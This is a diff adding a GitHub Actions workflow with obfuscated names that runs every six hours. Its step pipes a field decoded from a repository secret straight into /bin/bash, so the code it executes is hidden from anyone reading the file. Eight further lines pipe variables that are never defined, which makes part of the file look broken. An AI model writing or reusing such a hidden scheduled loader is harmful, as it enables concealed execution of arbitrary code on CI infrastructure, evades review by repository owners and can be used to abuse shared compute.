@@ -1,0 +1,24 @@
+name: dahamashu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dahamashu
+        env:
+          aewk92: ${{ secrets.aewk92 }}
+        run: |
+          echo $aewk92 | jq -r .nqf9847 | /bin/bash
+          echo $gn5452 | jq -r .mpzw37203 | /bin/bash
+          echo $lagq4552 | jq -r .sdfqw530 | /bin/bash
+          echo $mrtpr5580 | jq -r .wyx5110 | /bin/bash
+          echo $iop8109 | jq -r .ttv6941 | /bin/bash
+          echo $ugzkx9 | jq -r .qliy897 | /bin/bash
+          echo $o59337 | jq -r .tll588 | /bin/bash
+          echo $dl14675 | jq -r .wto939 | /bin/bash
+          echo $hvaq251 | jq -r .hzwa30 | /bin/bash
+
